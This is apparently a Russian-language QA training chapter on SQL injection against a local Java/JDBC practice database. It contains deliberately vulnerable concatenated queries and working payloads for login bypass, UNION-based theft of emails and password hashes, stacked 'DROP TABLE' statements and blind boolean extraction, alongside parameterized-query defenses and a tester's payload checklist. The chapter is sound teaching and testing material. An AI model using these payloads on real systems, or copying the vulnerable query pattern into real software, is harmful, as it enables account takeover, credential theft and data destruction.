# Часть 8. SQL Injection

Разбор уязвимостей и защиты для базы «ТехноМир». Самая важная часть для QA:
сначала видим, как ломается небезопасный код, потом — как его чинят.

Весь код — учебный стенд в [part8_injection/](part8_injection/) на Java + JDBC.
Запускать только на своей локальной базе. Разрушительный сценарий (8.3) —
исключительно на копии `shop_copy`.

## 8.1. Классический обход логина

Уязвимый код собирает запрос склейкой строк (`VulnerableDao.login`):

```java
"SELECT id, name FROM customers WHERE email = '" + email
    + "' AND password_hash = '" + password + "'"
```

В поле **email** подаём `' OR '1'='1' --`, пароль оставляем пустым. Итоговый SQL:

```sql
SELECT id, name FROM customers WHERE email = '' OR '1'='1' --' AND password_hash = ''
```

Результат на стенде: вход выполнен как **Анна Смирнова** (первый покупатель), пароль не проверялся.

**Почему пользователь вошёл без пароля:**
- `email = '' OR '1'='1'` — часть `'1'='1'` истинна всегда, поэтому условие выполняется для первой же строки таблицы;
- `--` в PostgreSQL начинает комментарий до конца строки, поэтому вся проверка пароля (`AND password_hash = '...'`) отброшена;
- `SELECT` вернул строку → приложение считает, что логин удался.

Введённый текст перестал быть *данными* и стал *частью кода* запроса. Это суть любой SQL-инъекции.

## 8.2. UNION-based — кража данных

Уязвимый поиск товаров (`VulnerableDao.searchProducts`):

```java
"SELECT name, price FROM products WHERE name LIKE '%" + search + "%'"
```

`UNION` приклеивает к выдаче строки из другой таблицы. Условие: число и типы колонок должны совпасть. Колонок две — `name` (text) и `price` (**numeric**). Поэтому нельзя просто взять `email, password_hash` (две text-колонки) — база ответит `UNION types numeric and character varying cannot be matched`. Оба секрета кладём в текстовую колонку, а в числовую — `0`.

Рабочая строка в поле **search**:

```
' UNION SELECT email || ' / ' || password_hash, 0 FROM customers --
```

Итоговый SQL:

```sql
SELECT name, price FROM products WHERE name LIKE '%'
UNION SELECT email || ' / ' || password_hash, 0 FROM customers --%'
```

Результат на стенде — в «товарную» выдачу попали логины и хэши паролей:

```
alina.zakharova@gmail.com / $2b$10$demoHashAlinaZakharova... | 0
irina.bogdanova@mail.ru   / $2b$10$demoHashIrinaBogdanova... | 0
...
```

Через поиск товаров утекли учётные данные всех покупателей.

## 8.3. Разрушающая инъекция (stacked queries)

Payload в поле поиска:

```
'; DROP TABLE reviews; --
```

превращает запрос в два оператора:

```sql
SELECT name, price FROM products WHERE name LIKE '%'; DROP TABLE reviews; --%'
```

> ❗ Выполнять только на копии `shop_copy`, не на основной базе.

Создание копии и проверка:

```bash
# копия базы
docker exec technomir_db psql -U postgres -c "DROP DATABASE IF EXISTS shop_copy"
docker exec technomir_db psql -U postgres -c "CREATE DATABASE shop_copy"
docker exec technomir_db sh -c "pg_dump -U postgres shop | psql -U postgres -q shop_copy"

# проверка атаки (пересоздавайте shop_copy перед каждым запуском)
cd part8_injection
DRIVER="$HOME/.m2/repository/org/postgresql/postgresql/42.7.2/postgresql-42.7.2.jar"
javac -d out src/*.java
java -cp "out:$DRIVER" StackedQueryProbe
```

Результат проверки:

```
[1] PreparedStatement (параметр):
  найдено товаров: 0
  reviews после PreparedStatement: 50 строк   <- таблица цела
[2] обычный Statement (склейка строк):
  reviews после Statement: ТАБЛИЦА ОТСУТСТВУЕТ
```

**❓ Почему драйверы «запрещают несколько запросов» — и почему это одновременно защита и ложное чувство безопасности.**

Многие драйверы и API действительно блокируют несколько операторов в одном вызове: MySQL Connector/J по умолчанию (`allowMultiQueries=false`), PHP `mysqli::query()`, параметризованные вызовы везде. Это защита от разрушительных stacked-инъекций.

Но полагаться на неё нельзя по двум причинам:

1. **Поведение зависит от драйвера.** Как показал стенд, PostgreSQL JDBC с обычным `Statement` **выполняет** несколько операторов через `;`. `executeQuery` при этом бросает ошибку «Multiple ResultSets», но `DROP TABLE reviews` уже отработал — таблица удалена. То есть «JDBC меня защитит» — миф.
2. **Запрет stacked-запросов не закрывает инъекцию.** Обход логина (8.1) и кража данных (8.2) используют ровно один оператор `SELECT` и работают даже там, где второй оператор запрещён. Блокировка `;` убирает только самый шумный сценарий (DROP), оставляя кражу и обход.

Единственная реальная защита — не склеивать ввод в текст запроса (см. 8.5). В том же стенде `PreparedStatement` с той же строкой просто ищет товар с таким названием (0 результатов), и таблица остаётся на месте.

## 8.4. Blind injection

Поле отвечает только «найдено / не найдено» и само данные не выводит (`VulnerableDao.customerExists` — проверка, есть ли покупатель с таким email). Даже так через ответы `true/false` можно вытаскивать данные по одному биту.

Опорные пробы (подставляем в email):

```
нет-такого@x' OR '1'='1    -> true   (условие всегда истинно)
нет-такого@x' AND '1'='2   -> false  (условие всегда ложно)
```

Дальше задаём вопросы к базе и читаем ответ по `true/false`:

```
нет-такого@x' OR (SELECT COUNT(*) FROM customers) > 20 --   -> true
нет-такого@x' OR (SELECT COUNT(*) FROM customers) > 50 --   -> false
```

Вывод атакующего: покупателей больше 20, но не больше 50 (на стенде их 30). Так же, по букве за раз, достают пароль:

```
... ' OR SUBSTRING((SELECT password_hash FROM customers WHERE id=1),1,1) = 'a' --
```

перебирая символы и сужая диапазон — медленно, но надёжно, даже когда на экран не выводится ни строки данных.

## 8.5. Защита

### 1. Параметризованные запросы (основной способ)

`SecureDao` делает те же операции через `PreparedStatement` с параметрами `?`:

```java
// логин
PreparedStatement ps = conn.prepareStatement(
    "SELECT id, name FROM customers WHERE email = ? AND password_hash = ?");
ps.setString(1, email);
ps.setString(2, password);

// поиск
PreparedStatement ps = conn.prepareStatement(
    "SELECT name, price FROM products WHERE name LIKE ?");
ps.setString(1, "%" + search + "%");   // % добавляем к значению, а не к SQL
```

Те же атаки против защищённых методов (вывод стенда):

```
обход логина 8.1   -> вошли как: null            (строка искалась как email целиком)
UNION-инъекция 8.2 -> найдено товаров: 0          (искали товар с таким названием)
```

**❓ Почему параметризация защищает, а ручное экранирование кавычек — нет.**
При `PreparedStatement` драйвер отправляет текст запроса и значения **по отдельности** (extended query protocol). Сервер уже разобрал запрос в план, где `?` — это место для *значения*; никакой текст параметра не может превратиться в новый фрагмент SQL. Структура запроса фиксируется до того, как подставлены данные.

Ручная замена `'` на `''` (`replace("'", "''")`) ненадёжна, потому что:
- легко забыть хотя бы в одном месте — и дыра остаётся;
- не спасает в числовом контексте без кавычек: `... WHERE id = ` + ввод, где `1 OR 1=1` вообще без кавычек;
- обходится через экранирующий символ, многобайтовые кодировки, Unicode-варианты кавычек;
- защита зависит от человека, а параметризация — от драйвера, автоматически.

### 2. Валидация ввода

Дополнительный слой (`SecureDao.loginWithValidation`): email проверяется регуляркой до обращения к базе. Это не замена параметрам, а эшелон защиты — отсечь заведомо некорректный ввод раньше.

### 3. Остальные уровни защиты

- **Наименьшие привилегии.** Аккаунт приложения `shop_app` — только `SELECT/INSERT/UPDATE` на нужные таблицы, без `DROP` и без доступа к `customers.password_hash` (реализовано в части 9.7, `GRANT`/`REVOKE`). Даже успешная инъекция не удалит таблицу и не прочитает хэши.
- **Хранить не пароли, а хэш + соль.** В базе `password_hash` (bcrypt), а не открытый пароль. При утечке (8.2) атакующий получает хэши, а не готовые пароли.
- **Не показывать текст SQL-ошибок пользователю.** Сообщения вида «UNION types … cannot be matched» подсказывают атакующему структуру запроса. Наружу — общее «Ошибка сервера», детали в лог.

### 4. ❓ ORM: помогает, но не панацея

ORM (Hibernate, SQLAlchemy) по умолчанию строит параметризованные запросы — обычные операции через ORM безопасны «из коробки». Но уязвимости остаются там, где разработчик снова склеивает строки:
- **нативные/raw-запросы** с конкатенацией ввода (`session.createNativeQuery("... " + input)`);
- **динамический `ORDER BY` / имя столбца или таблицы** — их нельзя передать параметром `?`, часто подставляют строкой. Защита — белый список допустимых значений, а не параметр;
- `LIKE`-паттерны и `IN`-списки, собранные вручную.

Вывод: ORM снимает рутинную защиту, но не отменяет правило «не подставляй ввод в текст запроса».

## 8.6. Чеклист тестировщика

Поля магазина «ТехноМир», которые нужно проверять на инъекции, и payload для каждого:

| # | Поле / место | Тип инъекции | Пробный payload |
|---|---|---|---|
| 1 | Email в форме логина | обход авторизации | `' OR '1'='1' --` |
| 2 | Пароль в форме логина | обход авторизации | `' OR '1'='1' --` |
| 3 | Строка поиска товаров | UNION-кража | `' UNION SELECT email, password_hash FROM customers --` |
| 4 | Фильтр по категории (`category_id`) | числовой контекст | `0 OR 1=1` |
| 5 | Фильтр по цене «от…до» | числовой контекст | `0; DROP TABLE reviews --` |
| 6 | Сортировка товаров (`ORDER BY`) | динамический столбец | `price; DROP TABLE reviews --` |
| 7 | Пагинация (`LIMIT`/`OFFSET`) | числовой контекст | `10; DROP TABLE orders --` |
| 8 | Форма регистрации (email, имя) | stored/второго порядка | `admin'--`, `'||(SELECT password_hash FROM customers LIMIT 1)||'` |
| 9 | Текст отзыва / поле комментария | stored injection | `'; UPDATE products SET price=1 --` |
| 10 | Промокод / купон при оформлении | blind / boolean | `' AND (SELECT COUNT(*) FROM customers) > 0 --` |

Как проверять каждое поле:
- подать одиночную кавычку `'` — если приходит SQL-ошибка или 500, поле собирает запрос склейкой;
- подать `' OR '1'='1' --` и булевы пары (`' AND '1'='2`) — разный ответ выдаёт blind-инъекцию;
- проверять не только формы, но и параметры URL, заголовки, JSON-поля API;
- проверка пройдена, если на всех полях ввод обрабатывается как данные: нет ошибок структуры SQL, выдача не меняется, таблицы целы.
